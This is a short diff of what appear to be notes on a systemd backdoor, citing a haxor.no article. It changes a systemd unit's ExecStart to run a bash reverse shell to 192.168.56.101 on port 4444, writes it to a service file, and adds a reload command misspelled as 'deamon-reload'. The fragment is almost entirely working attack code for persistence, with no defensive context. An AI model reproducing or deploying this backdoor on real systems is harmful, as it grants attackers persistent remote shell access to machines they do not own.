@@ -172,6 +172,8 @@ https://haxor.no/en/article/systemd-backdoor
 printf "[Unit]\nDescription=Custom Setup Service\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/setup.sh\n\n[Install]\nWantedBy=multi-user.target"
 Change to
 printf "[Unit]\nDescription=Custom Setup Service\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/4444 0>&1'\n\n[Install]\nWantedBy=multi-user.target" > service.name
+
+sudo systemctl deamon-reload 
 ```
 
 
